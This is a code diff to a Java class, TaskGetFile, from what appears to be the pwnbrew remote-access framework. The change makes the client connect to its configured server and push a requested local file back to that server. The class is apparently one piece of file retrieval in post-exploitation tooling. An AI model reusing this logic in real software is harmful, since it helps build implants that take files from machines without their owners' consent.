@@ -40,7 +40,10 @@ package pwnbrew.network.control.messages;
 
 import java.io.File;
 import java.io.UnsupportedEncodingException;
+import pwnbrew.ClientConfig;
+import pwnbrew.concurrent.LockListener;
 import pwnbrew.manager.PortManager;
+import pwnbrew.network.ClientPortRouter;
 import pwnbrew.utilities.DebugPrinter;
 import pwnbrew.network.ControlOption;
 import pwnbrew.network.control.ControlMessageManager;
@@ -50,10 +53,10 @@ import pwnbrew.network.control.ControlMessageManager;
  *
  *  
  */
-public final class TaskGetFile extends TaskStatus{
+public final class TaskGetFile extends TaskStatus implements LockListener {
 
-//    private File fileToRetrieve;
     private String hashFilenameStr;
+    private int lockVal = 0;
     
     //Class name
     private static final String NAME_Class = TaskGetFile.class.getSimpleName();
@@ -68,26 +71,7 @@ public final class TaskGetFile extends TaskStatus{
         super(msgId);
     }
      
-//    // ==========================================================================
-//    /**
-//     * Constructor
-//     *
-//     * @param taskId
-//     * @param fileHash
-//     * @param passedFile
-//     * @throws java.io.IOException
-//    */
-//    public TaskGetFile(int taskId, File passedFile, String fileHash ) throws IOException  {
-//        super(taskId , TaskStatus.TASK_XFER_FILES );
-//        fileToRetrieve = passedFile;
-//
-//        String fileHashNameStr = new StringBuilder().append(fileHash).append(":").append(fileToRetrieve.getName()).toString();
-//        byte[] strBytes = fileHashNameStr.getBytes();
-//        ControlOption aTlv = new ControlOption(OPTION_HASH_FILENAME, strBytes);
-//        addOption(aTlv);
-//    }
-    
-     //=========================================================================
+    //=========================================================================
     /**
      *  Sets the variable in the message related to this TLV
      * 
@@ -153,16 +137,61 @@ public final class TaskGetFile extends TaskStatus{
 
                 File fileToSend = new File(theFilePath);
                 if(fileToSend.exists()){
+                    
+                    ClientConfig theConf = ClientConfig.getConfig();
+                    int socketPort = theConf.getSocketPort();
+                    String serverIp = theConf.getServerIp();
 
-                    //Queue the file to be sent
-                    String fileHashNameStr = new StringBuilder().append("0").append(":").append(theFilePath).toString();
+                    //Get the port router
+                    ClientPortRouter aPR = (ClientPortRouter) passedManager.getPortRouter( socketPort );
+                  
+                    int retChannelId = aPR.ensureConnectivity( serverIp, socketPort, this );   
+                    if(retChannelId != 0 ){
+                        //Queue the file to be sent
+                        String fileHashNameStr = new StringBuilder().append("0").append(":").append(theFilePath).toString();
 
-                    PushFile thePFM = new PushFile( getTaskId(), fileHashNameStr, fileToSend.length(), PushFile.FILE_DOWNLOAD );
-                    thePFM.setDestHostId( getSrcHostId() );
-                    aCMManager.send(thePFM);
+                        PushFile thePFM = new PushFile( getTaskId(), retChannelId, fileHashNameStr, fileToSend.length(), PushFile.FILE_DOWNLOAD );
+                        thePFM.setDestHostId( getSrcHostId() );
+                        aCMManager.send(thePFM);
+                    }
                 }
             }
         }     
+    }
+    
+    //===============================================================
+    /**
+     * 
+     * @param lockOp 
+     */
+    @Override
+    public synchronized void lockUpdate(int lockOp) {
+        lockVal = lockOp;
+        notifyAll();
+    }
+    
+    //===============================================================
+    /**
+     * 
+     * @return  
+     */
+    @Override
+    public synchronized int waitForLock() {
+        
+        int retVal;        
+        while( lockVal == 0 ){
+            try {
+                wait();
+            } catch (InterruptedException ex) {
+                continue;
+            }
+        }
+        
+        //Set to temp and reset
+        retVal = lockVal;
+        lockVal = 0;
+        
+        return retVal;
     }
 
 }/* END CLASS TaskGetFile */
